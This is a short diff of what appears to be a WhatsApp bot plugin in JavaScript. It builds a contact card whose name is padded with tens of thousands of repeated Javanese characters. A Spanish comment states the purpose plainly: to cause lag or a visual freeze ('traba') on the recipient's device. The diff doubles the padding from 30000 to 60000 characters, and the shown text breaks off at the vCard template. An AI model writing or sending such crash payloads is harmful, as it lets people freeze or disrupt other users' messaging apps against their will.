@@ -1,7 +1,7 @@
 let handler = async (m, { conn }) => {
   const number = '521234567890'; // Número real del contacto
-  const basura = 'ꦾ'.repeat(30000); // Puedes ajustar esto según tu objetivo (lag, traba visual, etc.)
-  const visible = '🧠 CONTACTO 🧠'; // Nombre corto visible
+  const basura = 'ꦾ'.repeat(60000); // Puedes ajustar esto según tu objetivo (lag, traba visual, etc.)
+  const visible = '👀 CONTACTO 👀'; // Nombre corto visible
   const nombreFinal = visible + basura;
 
   const vcard = `
